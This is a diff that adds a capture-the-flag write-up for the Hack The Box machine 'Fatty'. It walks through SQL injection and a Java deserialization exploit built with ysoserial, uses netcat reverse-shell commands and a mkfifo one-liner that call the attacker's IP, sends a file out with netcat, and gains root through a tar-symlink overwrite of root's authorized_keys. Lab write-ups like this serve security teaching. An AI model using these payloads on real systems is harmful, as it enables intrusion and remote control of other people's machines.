@@ -192,4 +192,321 @@ When we try to log in, we see that it actually `connects`.
 
 ![](/assets/img/posts/fatty/5.png)
 
+Enumartion on Fatty-Server.jar
+=================================
 
+In `FattyDBSession.java` we may notice insecure `SQL execution`
+
+```bash
+public User checkLogin(User user) throws FattyDbSession.LoginException {
+    Statement stmt = null;
+    ResultSet rs = null;
+    User newUser = null;
+
+    try {
+      stmt = this.conn.createStatement();
+      rs = stmt.executeQuery("SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "'");
+```
+We have control on supplied username we can trigger `SQLi` to escalate qtc to have admin privileges.
+
+However this will fail with bad credentials error. Let’s review Java client again.
+
+In `User.java` we found that username is not plaintext:
+```bah
+String hashString = this.username + password + "clarabibimakeseverythingsecure";
+```
+
+And we are `admin` now!
+
+Back to `client/server` code and one may notice that `User` class is `Serializable` and uses that during password change:
+
+```bash
+public static String changePW(ArrayList<String> args, User user) {
+    logger.logInfo("[+] Method 'changePW' was called.");
+    int methodID = 7;
+    if (!user.getRole().isAllowed(methodID)) {
+      logger.logError("[+] Access denied. Method with id '" + methodID + "' was called by user '" + user.getUsername() + "' with role '" + user.getRoleName() + "'.");
+      return "Error: Method 'changePW' is not allowed for this user account";
+    } else {
+      String response = "";
+      String b64User = (String)args.get(0);
+      byte[] serializedUser = Base64.getDecoder().decode(b64User.getBytes());
+      ByteArrayInputStream bIn = new ByteArrayInputStream(serializedUser);
+
+      try {
+        ObjectInputStream oIn = new ObjectInputStream(bIn);
+        User var8 = (User)oIn.readObject();
+      } catch (Exception var9) {
+        var9.printStackTrace();
+        response = response + "Error: Failure while recovering the User object.";
+        return response;
+      }
+
+      response = response + "Info: Your call was successful, but the method is not fully implemented yet.";
+      return response;
+    }
+  }
+  
+  ```
+  The same method is not implemented on client and we need to do that ourself. 
+  
+  Exploiting the Deserialization Vulnerability.
+  ==============================================
+  
+  
+  Create the payload
+  --------------------
+  
+  Prepare payloads using [yoserial](https://github.com/frohoff/ysoserial)  Tool
+  
+  ```bash
+  root@dkali:~# java -jar ysoserial.jar CommonsCollections5 'nc 10.10.14.8 443 -e /bin/sh'| base64 -w 0
+<BASE-64 PAYLOAD>root@darkness:~# java -jar ysoserial.jar CommonsCollections5 'nc 10.10.14.8 443 -e /bin/sh'| base64 -w 0
+<BASE-64 PAYLOAD>
+```
+Let us assume that netcat is installed on the system. With this we can generate a payload
+
+
+![](/assets/img/posts/fatty/7.png)
+
+
+  Now we just have to enter the `base64 payload` into the password field and start our listener om any port
+  
+  Getting User.flag
+  ==================
+  
+  ```bash
+  root@kali:~# nc -lvnp 443
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.174.
+Ncat: Connection from 10.10.10.174:36287.
+whoami
+qtc
+
+```
+
+Let us upgrade the shell for easier usage
+
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.170 443 >/tmp/f &
+```
+
+
+```bash
+root@kali:~# rlwrap nc -lvnp 443
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.174.
+Ncat: Connection from 10.10.10.174:36793.
+/bin/sh: can't access tty; job control turned off
+2f265ce12800:/home/qtc$ 
+```
+
+
+Got a Shell hostname `2f265ce12800`
+
+```bash
+2f265ce12800:/home/qtc$ ls -alh
+total 16
+drwxr-sr-x    1 qtc      qtc         4.0K Oct 30  2019 .
+drwxr-xr-x    1 root     root        4.0K Oct 30  2019 ..
+drwx------    1 qtc      qtc         4.0K Oct 30  2019 .ssh
+----------    1 qtc      qtc           33 Oct 30  2019 user.txt
+2f265ce12800:/home/qtc$ chmod 400 user.txt
+2f265ce12800:/home/qtc$ cat user.txt
+7fab2***************************
+```
+
+
+Privilege escalation for Root
+================================
+
+Bbu default domain have no any permition
+
+```bash
+2f265ce12800:~$ ls -al
+total 24
+drwxr-sr-x    1 qtc      qtc           4096 Feb 10 23:10 .
+drwxr-xr-x    1 root     root          4096 Oct 30 11:11 ..
+-rw-------    1 qtc      qtc              8 Feb 10 23:10 .ash_history
+drwx------    1 qtc      qtc           4096 Oct 30 11:11 .ssh
+-rwxr-xr-x    1 qtc      qtc            250 Feb 10 23:05 rshell
+----------    1 qtc      qtc             33 Oct 30 11:10 user.txt
+2f265ce12800:~$
+```
+
+Enumeration as qtc
+--------------------
+
+we can use `pspy` tool for furthere enumaration.
+
+```bash
+2f265ce12800:/tmp$ wget 10.10.14.8/pspy64
+Connecting to 10.10.14.8 (10.10.14.8:80)
+pspy64                14% |****                            |  446k  0:00:05 ETA
+pspy64                71% |**********************          | 2137k  0:00:00 ETA
+pspy64               100% |********************************| 3006k  0:00:00 ETA
+
+2f265ce12800:/tmp$ chmod +x pspy64
+2f265ce12800:/tmp$ ./pspy64
+pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
+                   ░           ░ ░
+                               ░ ░
+[...]
+UID=0    PID=75     | crond -b 
+UID=0    PID=76     | sshd: [accepted]
+UID=22   PID=77     | sshd: [net]       
+UID=1000 PID=78     | sshd: qtc         
+UID=1000 PID=79     | scp -f /opt/fatty/tar/logs.tar
+[...]
+```
+
+ user qtc stores regularly copies the `/opt/fatty/tar/logs.tar` tar archive somewhere on the `real host`.
+
+We gonna check out the `/opt/fatty/tar` directory.
+
+```bash
+2f265ce12800:/opt/fatty$ ls -lh
+total 10592
+-rw-r--r--    1 root     root       10.3M Oct 30  2019 fatty-server.jar
+drwxr-xr-x    5 root     root        4.0K Oct 30  2019 files
+drwxr-xr-x    1 qtc      qtc         4.0K Jan 29 12:10 logs
+-rwxr-xr-x    1 root     root         406 Oct 30  2019 start.sh
+drwxr-xr-x    1 qtc      qtc         4.0K Jul 26 21:00 tar
+
+2f265ce12800:/opt/fatty/tar$ ls -alh
+total 32
+drwxr-xr-x    1 qtc      qtc         4.0K Jul 26 21:00 .
+drwxr-xr-x    1 root     root        4.0K Oct 30  2019 ..
+-rw-r--r--    1 qtc      qtc        21.0K Jul 27 09:00 logs.tar
+
+```
+
+Let us transfer the file to our machine using netcat.
+
+```bash
+2f265ce12800:/opt/fatty/tar$ cat logs.tar | nc 10.10.14.8 1234
+```
+
+```bash
+root@kali:~# nc -lvnp 1234 > logs.tar
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 10.10.10.174.
+Ncat: Connection from 10.10.10.174:39273.
+```
+
+Get ready, now the good thing comes.
+
+
+
+
+Exploiting the backup file
+============================
+
+We can assume that the archived data is copied somewhere and unpacked. We can exploit this by creating a symbolic link to a file we want to overwrite upon extraction. We can simply use `/root/.ssh/authorized_keys` to add our `public key`.
+
+Overwriting backup location
+-----------------------------
+
+Upon extraction the logs.tar file points to `/root/.ssh/authorized_keys. logs.tar` -> `/root/.ssh/authorized_keys`.
+
+Overwriting Target File
+------------------------
+
+Upon the second extraction the contents of the `logs.tar` file from the container is written to `/root/.ssh/authorized_keys`
+
+
+For this we have to first create the symbolic link, then pack the file in a tar archive and upload it to `/opt/fatty/tar/logs.tar`. We then have to wait for the archive to be uploaded. After the archive being uploaded, we overwrite the archive with our `public-key`.
+
+```bash
+root@kali:~# ln -s /root/.ssh/authorized_keys logs.tar
+root@kali:~# ls -lh logs.tar 
+lrwxrwxrwx 1 root root 26 Jul 27 11:35 logs.tar -> /root/.ssh/authorized_keys
+root@kali:~# tar cf logs2.tar logs.tar 
+root@kali:~# mv logs2.tar logs.tar
+```
+
+
+
+Now we have a logs.tar archive that contains a logs.tar file that points to `/root/.ssh/authorized_keys`.
+
+** Ganerating publik kay 
+
+```bash
+root@darkness:~# ssh-keygen -f id_rsa -N ""
+Generating public/private rsa key pair.
+Your identification has been saved in id_rsa
+Your public key has been saved in id_rsa.pub
+The key fingerprint is:
+SHA256:YsOI8jiY7io8x1EOniDxPFAFEFstoOEcqLfwhfZ8c18 root@darkness
+The key's randomart image is:
++---[RSA 3072]----+
+|**++.            |
+|B+o .            |
+|+B o             |
+|+.Bo.+           |
+|o=+** = S        |
+|.=o+oooo.   E    |
+|* o .. o . .     |
+|o+ o      .      |
+|=oo              |
++----[SHA256]-----+
+
+```
+**Uploading the file to Server
+
+```bash
+2f265ce12800:/opt/fatty/tar$ wget 10.10.14.8/logs.tar
+Connecting to 10.10.14.8 (10.10.14.8:80)
+logs.tar             100% |********************************| 10240  0:00:00 ETA
+```
+
+After the file is copied, we can `overwrite` the archive with our `ssh-key`.
+
+Login with SSH
+---------------
+
+```bash
+root@kali:~# ssh -i id_rsa root@10.10.10.174
+Linux fatty 4.9.0-11-amd64 #1 SMP Debian 4.9.189-3+deb9u1 (2019-09-20) x86_64
+[...]
+Last login: Wed Jan 29 12:31:22 2020
+root@fatty:~#
+root@fatty:~# ls -lh
+total 24K
+drwxr-xr-x 4 root root 4.0K Jul 27 11:51 client1
+drwxr-xr-x 4 root root 4.0K Jul 27 11:51 client2
+drwxr-xr-x 4 root root 4.0K Jul 27 11:51 client3
+-rw-r--r-- 1 root root  616 Jul 27 11:51 log-puller.log
+-rwxr-xr-x 1 root root 2.2K Oct 30  2019 log-puller.sh
+-rw------- 1 root root   33 Oct 30  2019 root.txt
+```
+
+Ro000000000ted Fatty
+=======================
+
+Hureeeeeeeeeeyyyyyyyyyyyyyy
+
+```bash
+root@fatty:~# cat root.txt 
+ee982***************************
+
+```
+
+
+![Mr.Robot](https://media1.tenor.com/images/6ac3f8221dc3a800aeb6e1d5d248ae33/tenor.gif?itemid=8385651)
